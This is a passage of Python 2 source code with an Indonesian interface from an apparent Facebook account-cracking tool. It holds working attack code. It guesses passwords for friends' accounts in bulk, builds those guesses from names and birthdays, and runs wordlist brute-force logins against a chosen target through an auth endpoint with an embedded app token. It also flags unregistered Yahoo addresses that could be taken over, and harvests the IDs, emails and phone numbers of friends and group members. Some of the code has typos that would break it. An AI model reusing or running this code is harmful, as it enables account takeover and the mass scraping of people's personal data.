    write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[0m[\x1b[94;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mMengcrack \x1b[77;1m' + o,
        sys.stdout.flush()
        time.sleep(1)
    print
    print

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass1
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass1
                    else:
                            pass2 = b['firs_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass2
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass2
                                else:
                                        pass3 = b['last_name'] + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass3
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass3
                                            else:
                                                    lahir = b['birthday']
                                                    pass4 = lahir.replace('/', '')
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass4
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass4
                                                        else:
                                                            pass5 = ('sayang')
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass5
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass5
                                                                else:
                                                                    pass6 = ('sayangku')
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass6
                                                                    else:
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass6
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ('\n\x1b[0m[\x1b[94m#\x1b[0m] \x1b[77;1mSelesai')
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        try:
            email = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID/Email/Hp Target :\x1b[0m ')
            passw = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mWordlist \x1b[0mext(list.txt) \x1b[77;1m: \x1b[0m')
            total = open(passw, 'r')
            total = total.readlines()
            print
            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mTarget :\x1b[77;1m ' + email
            print '\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mJumlah\x1b[77;1m ' + str(len(total)) + ' \x1b[77;1mPassword'
            write ('\x1b[0m[\x1b[95;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[0m[\x1b[93;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mMengulang \x1b[0m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print ('\n\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.')
                        print
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[77;1mPengguna :\x1b[0m ' + email
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[77;1mSandi    :\x1b[0m ' + pw
                        exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print ('\n\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.')
                            print
                            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun kena cekpoint')
                            print '\x1b[0m[\xe2\x9e\xb9] \x1b[77;1mPengguna :\x1b[0m ' + email
                            print '\x1b[0m[\xe2\x9e\xb9] \x1b[77;1mSandi    :\x1b[0m ' + pw
                            exit()
                except requests.exceptions.ConnectionError:
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKoneksi terganggu')
                    time.sleep(1)
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerkas tidak ditemukan')
            print ('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMungkin anda salah membuat berkas')
            tanyaw()

def answer():
    why = raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mApa anda ingin menyuting Wordlist ? \x1b[0m[y/t]\x1b[77;1m:\x1b[0m ')
    if why == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSilahkan pilih \x1b[0m[Y/n]')
        answer()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 'n':
                    menu_hack()
                else:
                    if why == 'N':
                        menu_hack()
                    else:
                        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSilahkan pilih \x1b[0m[Y/n]')
                        answer()

def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('clear')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mDari Teman')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mDari Berkas')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    yahoo_select()

def yahoo_select():
    yahoo = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if yahoo == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        yahoo_select()
    else:
        if yahoo == '01' or yahoo == '1':
            yahoofriends()
        else:
            if yahoo == '02' or yahoo == '2':
                yahoolist()
            else:
                if yahoo == '00' or yahoo == '0':
                    menu_hack()
                else:
                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96] \x1b[0m' + yahoo + ' \x1b[77;1mTidak ditemukan'
                    yahoo_select()

def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    mpsh = []
    jml = 0
    wite ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x96\x1b[0m] \x1b[0mEmail \x1b[77;1m:\x1b[77;1m ' + mail + ' \x1b[0m[\x1b[77;1m' + vulnot + '\x1b[0m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama  \x1b[0m:\x1b[77;1m ' + nama
                    print '\x1b[0m[\x1b[93;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + id
                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ' + mail + ' [\x1b[77;1m' + vuln + '\x1b[0m]'
                    print
                else:
                    print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ' + mail + ' \x1b[0m[\x1b[77;1m' + vulnot + '\x1b[0m]'
        except KeyError:
            pass
    print ('\n\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mSelesai')
    print ('\x1b[0m[\x1b[95m+\x1b[0m] \x1b[77;1mSimpan \x1b[77;1m:\x1b[0m MailVuln.txt')
    save.close()
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    menu_yahoo()

def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print logo
        print
        files = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMasukan Berkas \x1b[77;1m: \x1b[0m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_yahoo()
    mpsh = []
    jml = 0
    write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    save = open('MailVuln.txt', 'w')
    print ''
    print '\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mStatus \x1b[77;1m:  \x1b[0mMerah[\x1b[91;1m' + vulnot + '\x1b[0m]  Hijau[\x1b[92;1m' + vuln + '\x1b[0m]'
    print ''
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[0m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[0m ' + mail
            else:
                print '\x1b[0m ' + mail
    print ('\n\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mSelesai')
    print ('\x1b[0m[\x1b[94m+\x1b[0m] \x1b[77;1mSimpan \x1b[77;1m:\x1b[0m MailVuln.txt')
    save.close()
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    menu_yahoo()

def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mAmbil ID dari Teman')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mAmbil ID Teman dari Teman')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mAmbil ID dari Grup')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mAmbil Email dari Teman')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mAmbil Email Teman dari Teman')
    print ('\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAmbil Nomor Telepon dari Teman')
    print ('\x1b[0m[\x1b[96;1m7\x1b[0m] \x1b[77;1mAmbil Nomor Telepon Teman dari Teman')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    grab_select()

def grab_select():
    grab = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if grab == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        grab_select()
    else:
        if grab == '01' or grab == '1':
            id_friends()
        else:
            if grab == '02' or grab == '2':
                idfrom_friends()
            else:
                if grab == '03' or grab == '3':
                    id_member_grup()
                else:
                    if grab == '04' or grab == '4':
                        email()
                    else:
                        if grab == '05' or grab == '5':
                            emailfrom_friends()
                        else:
                            if cuih == '06' or grab == '6':
                                number_hp()
                            else:
                                if grab == '07' or grab == '7':
                                    hpfrom_friends()
                                else:
                                    if grab == '00' or grab == '0':
                                        menu_hack()
                                    else:
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + grab + ' \x1b[77;1mTidak ditemukan'
                                        grab_select()

def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[77;1m: \x1b[0m')
            bz = open(save_id, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[0mNama\x1b[77;1m  :\x1b[77;1m ' + ah['name']
                print '\x1b[0mID   \x1b[77;1m : \x1b[77;1m' + ah['id']
                print
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah ID \x1b[77;1m %s' % len(idfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + save_id
            bz.close()
            raw_input('\n\x1b[0m[ \x1b[93;1Kembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTerdapat kesalahan saat menyimpan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Teman \x1b[77;1m: \x1b[77;1m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mDari\x1b[77;1m :\x1b[77;1m ' + op['name']
            except KeyError:
                print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTeman tidak ditemukan')
                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                grab()
            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            bz = open(save_idt, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[0mNama\x1b[0m  :\x1b[77;1m ' + ah['name']
                print '\x1b[0mID   \x1b[0m : \x1b[77;1m' + ah['id']
                print
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah ID \x1b[77;1m %s' % len(idfromfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + save_idt
            bz.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Grup \x1b[0m:\x1b[77;1m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama Grup \x1b[0m:\x1b[77;1m ' + asw['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup tidak ditemukan'
                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                grab()
            simg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            b = open(simg, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[0mNama\x1b[0m  :\x1b[77;1m ' + i['name']
                print '\x1b[0mID  \x1b[0m  :\x1b[77;1m ' + i['id']
                print
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah ID \x1b[77;1m %s' % len(idmem)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + simg
            b.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas'
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except KeyError:
            os.remove(simg)
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('clear')
            print
            print (logo)
            print
            mails = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[0mNama\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mEmail\x1b[0m : \x1b[77;1m' + z['email']
                    print
                except KeyError:
                    pass
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah Email\x1b[77;1m %s' % len(em)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + mails
            mpsh.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except KeyError:
            os.remove(mails)
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mEmail tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Teman \x1b[0m: \x1b[77;1m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mDari\x1b[0m :\x1b[77;1m ' + op['name']
            except KeyError:
                print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTeman tidak ditemukan')
                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                grab()

            mails = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            wite ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[0mNama\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mEmail\x1b[0m : \x1b[77;1m' + z['email']
                    print
                except KeyError:
                    pass
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah Email\x1b[77;1m %s' % len(emfromfriends)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + mails
            mpsh.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def number_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
